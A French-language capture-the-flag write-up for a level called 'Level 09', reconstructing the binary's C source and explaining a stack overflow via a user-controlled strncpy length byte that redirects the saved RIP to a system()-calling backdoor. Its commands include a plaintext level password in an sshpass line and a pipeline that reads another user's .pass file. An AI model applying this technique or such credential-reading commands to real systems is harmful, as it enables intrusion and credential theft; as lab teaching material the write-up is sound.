# Level 09

Lorsqu'on exécute le binaire, un username puis un message est attendu sur l'entrée standard.

On peut réécrire un code source en C :

```c
void secret_backdoor()
{
	char *buffer;

	fgets(buffer, 0x80, 0);
	system(buffer);
}

void set_message(
	char *data // rbp-0x408
)
{
	char buffer[1024]; // rbp-0x400

	bzero(buffer, 1024);
	puts(">: Msg @Unix-Dude");
	printf(">>: ");
	fgets(buffer, 1024, 0);
	strncpy(data, buffer, data[180]);
}

void set_username(
	char *data // rbp-0x98
)
{
	char buffer[128]; // rbp-0x90
	uint i;			  // rbp-0x4

	bzero(buffer, 128);
	puts(">: Enter your data");
	printf(">>: ");
	fgets(buffer, 128, 0);
	i = 0;
	while (i <= 40 && buffer[i])
	{
		(data + 140)[i] = buffer[i];
		i++;
	}
	printf(">: Welcome, %s", data + 140);
}

void handle_msg(void)
{
	char *data; // rbp-0xc0

	bzero(data + 140, 40);
	data[180] = 140;
	set_username(data);
	set_message(data);
	puts(">: Msg sent!");
}

int main(int argc, const char **argv)
{
	puts("--------------------------------------------");
	puts("|   ~Welcome to l33t-m$n ~    v1337        |");
	puts("--------------------------------------------");
	handle_msg();
}
```

On remarque rapidement quelque chose d'étrange dans la fonction _set_message_. En effet, le troisième argument de la fonction _strncpy_, la taille maximale d'octets à copier, n'est pas écris en dur. Il s'agit du 180e octet du buffer dans lequel on écrit l'username et le message. Sa valeur par défaut est de 140.

Si on l'écrase par une valeur plus haute, on pourra overflow le buffer et écraser le **rip sauvegardé** par l'adresse de notre choix. Par exemple l'adresse de la fonction _secret_backdoor_ qui exécute la commande _system_ avec l'argument de notre choix.

Sachant que l'username est écrit à l'adresse `buffer + 140` et qu'il faut modifier le 180e octet, il faudra un padding de 40 octets. Le 41e octet sera la taille copié par la fonction _strncpy_, qu'on peut mettre à la valeur maximale d'un octet `0xff (hex) = 255 (dec)`.

De plus le **rip sauvegardé** est séparé de 200 octets de l'adresse du buffer donc toutes les conditions sont réunies pour effectuer cet exploit.

## Commandes

Depuis l'hôte :

```bash
make && ./generator  && sshpass -p 'fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S' scp -P 4242 -r args level09@localhost:/tmp/
```

Sur la vm :

```bash
(cat /tmp/args/arg1; cat /tmp/args/arg2 ; echo "/bin/cat /home/users/end/.pass") | ./level09
```
